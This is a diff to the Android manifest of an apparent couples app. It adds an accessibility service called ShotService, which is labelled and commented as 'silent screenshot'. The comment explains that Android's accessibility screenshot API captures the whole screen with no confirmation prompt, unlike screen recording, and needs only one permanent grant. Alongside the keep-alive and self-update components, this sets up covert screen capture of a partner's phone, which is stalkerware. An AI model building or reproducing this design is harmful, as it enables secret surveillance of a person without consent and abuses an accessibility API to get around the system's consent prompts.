@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.couple.xiaowo.order"
-    android:versionCode="23"
-    android:versionName="3.2">
+    android:versionCode="30"
+    android:versionName="3.7.2">
 
     <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34" />
 
@@ -14,6 +14,8 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <!-- 悬浮窗：让对方发来的爱心和消息直接飘到屏幕上 -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <!-- 锁屏也能显示全屏通知（vivo 锁屏弹出提醒靠它） -->
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
     <!-- Android 14+ 里，从后台弹悬浮窗需要声明这个，否则会被系统拦 -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <!-- 自动更新：下载新版本后调起系统安装器 -->
@@ -49,6 +51,30 @@
             android:name="com.couple.xiaowo.core.KeepAlive"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
+
+        <!--
+            单端静默截屏：无障碍服务。
+
+            为什么是无障碍：Android 11 (API 30) 给 AccessibilityService 加了
+            takeScreenshot()，只要配置里声明 canTakeScreenshot="true" 并处于运行状态，
+            就能**直接拿到整屏 Bitmap，没有任何确认弹窗**。
+            MediaProjection 每次都要用户点「开始录制」，做不到静默。
+
+            授权只做一次：用户在系统设置 → 无障碍里勾选本服务，之后永久有效。
+            metadata 指向 res/xml/shot_service.xml。
+        -->
+        <service
+            android:name="com.couple.xiaowo.core.ShotService"
+            android:exported="true"
+            android:label="@APP_LABEL@·静默截屏"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/shot_service" />
+        </service>
 
         <!-- 自动更新用：把下载好的 APK 以 content:// 交给系统安装器 -->
         <provider
